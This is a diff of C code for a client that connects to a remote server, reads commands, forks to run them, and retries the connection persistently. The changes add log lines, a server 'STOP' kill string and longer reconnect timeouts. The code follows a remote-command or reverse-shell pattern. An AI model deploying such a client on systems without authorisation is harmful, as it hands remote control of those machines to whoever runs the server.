@@ -18,8 +18,10 @@ static int try_reconnect(const char *ipaddr, uint16_t port,
 	for (size_t i = 0; i < timeout; ++i) {
 		trace(T_ACK, "Try: %zu, Reconnecting ...\n", i + 1);
 		self->fd = connect_to(ipaddr, port, self->saddr);
-		if (self->fd != -1)
+		if (self->fd != -1) {
+			trace(T_INFO, "Reconnected!\n");
 			return (0);
+		}
 		sleep(1);
 	}
 	return (-1);
@@ -58,6 +60,10 @@ static int run_command(cclient_t *self)
 
 	if (cbuffer_getbytes(self->cbuffer, &cmd, '\n') == -1 || cmd == NULL)
 		return (-1);
+	if (strcmp(cmd, "\a\aSTOP\a\a") == 0) {
+		trace(T_INFO, "Ejected by server\n");
+		exit(0);
+	}
 	if (fork() != 0)
 		return (0);
 	cmd[strlen(cmd) - 1] = 0;
@@ -84,11 +90,13 @@ int client_mode(const char *ipaddr, uint16_t port)
 		trace(T_PANIC, "Can't start client\n");
 		return (-1);
 	}
+	if (fd != -1)
+		trace(T_INFO, "Connected !\n");
 	while (is_running) {
-		if (self.fd == -1 && try_reconnect(ipaddr, port, &self, 5) == -1)
+		if (self.fd == -1 && try_reconnect(ipaddr, port, &self, 60) == -1)
 			break;
 		rdonly(NULL, &self);
-		if (run_command(&self) == -1 && try_reconnect(ipaddr, port, &self, 10) == -1)
+		if (run_command(&self) == -1 && try_reconnect(ipaddr, port, &self, 60) == -1)
 			break;
 	}
 	cclient_destroy(&self);
